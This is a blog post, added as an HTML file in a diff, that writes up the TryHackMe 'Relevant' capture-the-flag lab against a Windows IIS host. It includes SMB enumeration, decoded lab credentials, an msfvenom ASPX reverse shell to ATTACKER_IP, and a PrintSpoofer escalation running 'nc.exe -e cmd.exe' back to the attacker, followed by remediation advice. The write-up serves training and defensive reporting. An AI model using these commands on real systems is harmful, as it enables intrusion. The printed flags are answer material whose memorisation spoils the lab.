@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Relevant | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: Black-box pentest of a Windows IIS environment. Anonymous SMB enumeration recovers Base64-encoded credentials, writable share maps to IIS virtual directory at port 49663, ASPX webshell upload for initial access, SeImpersonatePrivilege plus PrintSpoofer for SYSTEM. MS17-010 detected, not used.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/relevant.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/relevant.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Relevant">
+<meta property="og:description" content="TryHackMe CTF: Black-box pentest of a Windows IIS environment. Anonymous SMB enumeration recovers Base64-encoded credentials, writable share maps to IIS virtual directory at port 49663, ASPX webshell upload for initial access, SeImpersonatePrivilege plus PrintSpoofer for SYSTEM. MS17-010 detected, not used.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Relevant">
+<meta name="twitter:description" content="TryHackMe CTF: Black-box pentest of a Windows IIS environment. Anonymous SMB enumeration recovers Base64-encoded credentials, writable share maps to IIS virtual directory at port 49663, ASPX webshell upload for initial access, SeImpersonatePrivilege plus PrintSpoofer for SYSTEM. MS17-010 detected, not used.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Relevant</h1>
+    <div class="post-description">TryHackMe CTF. A black-box penetration test against a Windows environment scheduled for production in seven days. Two flags. No information provided. Manual exploitation preferred.</div>
+  </header>
+
+  <div class="post-content">
+
+<h2>Pre-engagement scope</h2>
+
+<ul>
+<li>External, web app, and internal assessment of the provided environment</li>
+<li>Two flags: <code>user.txt</code> and <code>root.txt</code></li>
+<li>Manual exploitation first, any tools permitted</li>
+<li>Locate and report all vulnerabilities (more than one path to root)</li>
+<li>Only the assigned IP in scope</li>
+</ul>
+
+<p>Documentation follows engagement format: Evidence Log, findings, exploitation path, remediation.</p>
+
+<h2>Evidence Log</h2>
+
+<table>
+<thead>
+<tr><th>Step</th><th>Finding</th><th>Impact</th></tr>
+</thead>
+<tbody>
+<tr><td>01</td><td>Open ports discovered</td><td>Attack surface</td></tr>
+<tr><td>02</td><td>SMB share exposed</td><td>Information disclosure</td></tr>
+<tr><td>03</td><td>Credentials found in plaintext (Base64 encoded)</td><td>Credential exposure</td></tr>
+<tr><td>04</td><td>Writable share</td><td>Remote code execution path</td></tr>
+<tr><td>05</td><td>Web shell execution via IIS path</td><td>Initial access</td></tr>
+<tr><td>06</td><td>SeImpersonatePrivilege + PrintSpoofer</td><td>SYSTEM</td></tr>
+</tbody>
+</table>
+
+<h2>Reconnaissance</h2>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV -p- --script=vuln -T4 -A TARGET_IP -oA relevant_nmap</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.25.57 AM.png" alt="Nmap scan results showing open ports including IIS, SMB, RDP, and MS17-010 vulnerability detection" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Key findings:</strong></p>
+<ul>
+<li>80/tcp IIS 10.0</li>
+<li>135/tcp MSRPC</li>
+<li>139/tcp NetBIOS/SMB</li>
+<li>445/tcp SMB</li>
+<li>3389/tcp RDP</li>
+<li>49663/tcp IIS 10.0</li>
+<li>49667-68 MSRPC</li>
+</ul>
+
+<p>The single most stand-out result:</p>
+
+<pre><code>smb-vuln-ms17-010: VULNERABLE</code></pre>
+
+<p>MS17-010 is logged for the report, but that is not the intended path. The two IIS ports plus open SMB are the more interesting combination here.</p>
+
+<p><strong>Post-scanning findings:</strong></p>
+
+<table>
+<thead>
+<tr><th>Finding</th><th>Evidence</th><th>Impact</th></tr>
+</thead>
+<tbody>
+<tr><td>SMB exposed</td><td>139/445 open</td><td>File share enumeration possible</td></tr>
+<tr><td>IIS exposed</td><td>80 and 49663 open</td><td>Web attack surface</td></tr>
+<tr><td>RDP exposed</td><td>3389 open</td><td>Remote access surface / brute-force risk</td></tr>
+<tr><td>MS17-010 detected</td><td>Nmap smb-vuln-ms17-010</td><td>Critical SMBv1 RCE exposure</td></tr>
+</tbody>
+</table>
+
+<p><strong>Next step:</strong> anonymously enumerate SMB shares.</p>
+
+<h2>SMB enumeration</h2>
+
+<p>SMB enum scan 1:</p>
+
+<pre><code class="language-bash">smbclient -L //TARGET_IP/ -N</code></pre>
+
+<p>SMB enum scan 2:</p>
+
+<pre><code class="language-bash">smbmap -H TARGET_IP</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.30.15 AM.png" alt="smbclient listing shares anonymously, revealing a custom nt4wrksv share" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.31.20 AM.png" alt="smbmap output showing share permissions and the nt4wrksv share" style="max-width:100%;margin:2rem 0;">
+
+<p>A custom SMB share is observed in SMB enum scan 1.</p>
+
+<p><strong>Next step:</strong> maintaining anonymity, connect to the custom share and list its files.</p>
+
+<pre><code class="language-bash">smbclient //TARGET_IP/nt4wrksv -N</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.34.47 AM.png" alt="Anonymous smbclient connection to nt4wrksv share succeeding" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>ls
+get passwords.txt
+exit</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.35.39 AM.png" alt="Directory listing of nt4wrksv share showing passwords.txt, get command downloading it" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">cat passwords.txt</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.36.48 AM.png" alt="Contents of passwords.txt showing two Base64-encoded credential strings" style="max-width:100%;margin:2rem 0;">
+
+<p>The contents are Base64 encoded. Decode both:</p>
+
+<pre><code class="language-bash">echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d; echo
+echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d; echo</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.39.14 AM.png" alt="Base64 decode output revealing Bob and Bill credentials in plaintext" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>Bob - !P@$$W0rD!123
+Bill - Juw4nnaM4n420696969!$$$</code></pre>
+
+<p><strong>Internal note:</strong> absolutely blessed password design on Bill&rsquo;s part.</p>
+
+<pre><code>movie reference
+leet-ish substitutions
+unhinged number run
+punctuation confetti
+still leaked in plaintext after Base64</code></pre>
+
+<p><strong>Finding:</strong> Base64 encoding was used to store credentials in <code>passwords.txt</code>. Anyone with read access to the SMB share can decode the contents and recover valid usernames and passwords.</p>
+
+<p><strong>Next step:</strong> test Bill&rsquo;s blessed credentials.</p>
+
+<h2>Authenticated SMB access</h2>
+
+<pre><code class="language-bash">smbclient //TARGET_IP/nt4wrksv -U 'Bill'</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.43.54 AM.png" alt="Authenticated smbclient session as Bill connecting to nt4wrksv" style="max-width:100%;margin:2rem 0;">
+
+<p>Juwanna Man has helped yet another covert operation.</p>
+
+<p>Write access confirmed:</p>
+
+<pre><code class="language-bash">echo "jenn was here" &gt; test.txt
+# inside the SMB session:
+put test.txt
+ls
+del test.txt</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.47.18 AM.png" alt="SMB session showing test.txt successfully uploaded and deleted, confirming write access" style="max-width:100%;margin:2rem 0;">
+
+<table>
+<thead>
+<tr><th>Finding</th><th>Evidence</th><th>Impact</th></tr>
+</thead>
+<tbody>
+<tr><td>Valid SMB credentials recovered</td><td>Bill login successful</td><td>Authenticated access to exposed file share</td></tr>
+<tr><td>SMB share write access</td><td>Successful file upload to <code>nt4wrksv</code></td><td>Potential webshell upload / remote code execution</td></tr>
+</tbody>
+</table>
+
+<p><strong>Next step:</strong> determine whether the SMB share maps to a web-accessible path on either IIS port.</p>
+
+<h2>SMB-to-IIS mapping</h2>
+
+<p>Upload a test file, then test both ports at the web root:</p>
+
+<pre><code class="language-bash">echo "SMB-to-IIS test" &gt; test.html
+curl -i http://TARGET_IP/test.html
+curl -i http://TARGET_IP:49663/test.html</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 8.53.16 AM.png" alt="curl requests to port 80 and 49663 at web root returning 404" style="max-width:100%;margin:2rem 0;">
+
+<p>Both return 404. Test with the share name appended as a virtual directory path:</p>
+
+<pre><code class="language-bash">curl -i http://TARGET_IP/nt4wrksv/test.html
+curl -i http://TARGET_IP:49663/nt4wrksv/test.html</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-08 at 9.10.30 AM.png" alt="curl to port 49663 with nt4wrksv path returning 200, confirming SMB share is mounted as IIS virtual directory" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Confirmed.</strong> <code>\\TARGET_IP\nt4wrksv</code> is mounted as a virtual directory at <code>http://TARGET_IP:49663/nt4wrksv/</code>.</p>
+
+<table>
+<thead>
+<tr><th>Finding</th><th>Evidence</th><th>Impact</th></tr>
+</thead>
+<tbody>
+<tr><td>Writable SMB share mapped to IIS web directory</td><td>Uploaded file accessible at <code>:49663/nt4wrksv/</code></td><td>Allows upload and execution of web content via HTTP</td></tr>
+</tbody>
+</table>
+
+<p><strong>Key exploit bridge:</strong> writable SMB share + IIS-served directory = webshell upload path.</p>
+
+<h2>Initial access via ASPX webshell</h2>
+
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx</code></pre>
+
+<p>Listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+<p>Upload <code>shell.aspx</code> to Bill&rsquo;s writable share. Connect with the password of legends.</p>
+
+<pre><code class="language-bash">smbclient //TARGET_IP/nt4wrksv -U 'Bill'
+put shell.aspx
+exit</code></pre>
+
+<p>Side commentary: whoever did the content creation on this deserves an Emmy for in-lab comedic entertainment. Bill&rsquo;s password is the epitome of pristine CTF humor.</p>
+
+<p>Trigger:</p>
+
+<pre><code class="language-bash">curl http://TARGET_IP:49663/nt4wrksv/shell.aspx</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 6.29.33 AM.png" alt="Netcat listener catching the reverse shell from the ASPX webshell trigger" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 6.30.52 AM.png" alt="Initial shell prompt as iis apppool\defaultapppool in C:\Windows\System32\inetsrv" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Shell user:</strong> <code>iis apppool\defaultapppool</code><br>
+<strong>Working dir:</strong> <code>C:\Windows\System32\inetsrv</code></p>
+
+<h2>Enumeration and user flag</h2>
+
+<pre><code class="language-cmd">whoami /priv
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 6.32.14 AM.png" alt="whoami /priv output showing SeImpersonatePrivilege is enabled" style="max-width:100%;margin:2rem 0;">
+
+<p><code>SeImpersonatePrivilege: Enabled</code>. Privesc path confirmed.</p>
+
+<pre><code class="language-cmd">dir C:\Users</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 6.34.04 AM.png" alt="dir C:\Users listing Bob, Administrator, and other users" style="max-width:100%;margin:2rem 0;">
+
+<p>Move in on Bob&rsquo;s folder. I see how one may confuse Bob with Bill. Sneaky. Nice try.</p>
+
+<pre><code class="language-cmd">dir C:\Users\Bob\Desktop
+type C:\Users\Bob\Desktop\user.txt</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 6.36.32 AM.png" alt="dir C:\Users\Bob\Desktop listing user.txt" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 6.38.00 AM.png" alt="type user.txt showing user flag THM{fdk4ka34vk346ksxfr21tg789ktf45}" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>User flag:</strong> <code>THM{fdk4ka34vk346ksxfr21tg789ktf45}</code></p>
+
+<h2>Privilege escalation via PrintSpoofer</h2>
+
+<pre><code class="language-bash">wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe</code></pre>
+
+<p>Upload to Bill&rsquo;s writable share:</p>
+
+<pre><code class="language-bash">smbclient //TARGET_IP/nt4wrksv -U 'Bill'
+put PrintSpoofer64.exe
+exit</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 6.44.26 AM.png" alt="smbclient session showing PrintSpoofer64.exe and nc.exe uploaded to nt4wrksv share" style="max-width:100%;margin:2rem 0;">
+
+<p>The eagle has landed. Same for <code>nc.exe</code>:</p>
+
+<pre><code class="language-bash">cp /usr/share/windows-resources/binaries/nc.exe .
+smbclient //TARGET_IP/nt4wrksv -U 'Bill'
+put nc.exe
+exit</code></pre>
+
+<p>Second listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 5555</code></pre>
+
+<p>In the Windows shell:</p>
+
+<pre><code class="language-cmd">C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe -c "C:\inetpub\wwwroot\nt4wrksv\nc.exe -e cmd.exe ATTACKER_IP 5555"</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 6.59.57 AM.png" alt="PrintSpoofer64.exe executing the token impersonation command in the Windows shell" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 7.00.25 AM.png" alt="Second netcat listener catching the SYSTEM shell from PrintSpoofer" style="max-width:100%;margin:2rem 0;">
+
+<p><code>nt authority\system</code>.</p>
+
+<h2>Root flag</h2>
+
+<pre><code class="language-cmd">type C:\Users\Administrator\Desktop\root.txt</code></pre>
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 7.02.52 AM.png" alt="type root.txt showing root flag THM{1fk5kf469devly1gl320zafgl345pv}" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Root flag:</strong> <code>THM{1fk5kf469devly1gl320zafgl345pv}</code></p>
+
+<img src="/images/relevant/Screenshot 2026-06-09 at 7.03.43 AM.png" alt="Final confirmation screenshot of SYSTEM shell with root flag retrieved" style="max-width:100%;margin:2rem 0;">
+
+<h2>Final exploit chain</h2>
+
+<pre><code>SMB enumeration (anonymous)
+  -&gt; custom share nt4wrksv discovered
+  -&gt; passwords.txt readable
+  -&gt; Base64 decode reveals Bob and Bill credentials
+Authenticated SMB as Bill
+  -&gt; write access confirmed
+  -&gt; share maps to IIS virtual directory on port 49663
+ASPX webshell upload via SMB write
+  -&gt; curl trigger over HTTP
+  -&gt; shell as iis apppool\defaultapppool
+  -&gt; SeImpersonatePrivilege enabled
+  -&gt; user.txt from Bob&rsquo;s Desktop
+PrintSpoofer + nc.exe uploaded via Bill&rsquo;s share
+  -&gt; token impersonation against printer service
+  -&gt; SYSTEM shell
+  -&gt; root.txt</code></pre>
+
+<hr>
+
+<h2>Key report findings</h2>
+
+<ul>
+<li>Exposed SMB services with anonymous read access</li>
+<li>Plaintext credential disclosure in <code>nt4wrksv</code> SMB share</li>
+<li>Base64 used as the only protection on stored credentials</li>
+<li>Valid credentials recovered for Bill</li>
+<li>Writable SMB share mapped to IIS virtual directory at <code>:49663/nt4wrksv/</code></li>
+<li>Remote code execution via ASPX webshell upload</li>
+<li>IIS application pool identity granted SeImpersonatePrivilege</li>
+<li>SYSTEM-level privilege escalation via PrintSpoofer token impersonation</li>
+<li>MS17-010 (EternalBlue) detected by Nmap, additional critical exposure not used in this path</li>
+</ul>
+
+<h2>Remediation summary</h2>
+
+<ul>
+<li>Remove anonymous SMB access; require authentication for all shares</li>
+<li>Remove credential files from SMB shares entirely</li>
+<li>Decouple SMB shares from IIS virtual directory mappings</li>
+<li>Remove SeImpersonatePrivilege from IIS application pool identities, or constrain via a custom service account</li>
+<li>Apply MS17-010 patches and disable SMBv1 across the environment</li>
+</ul>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
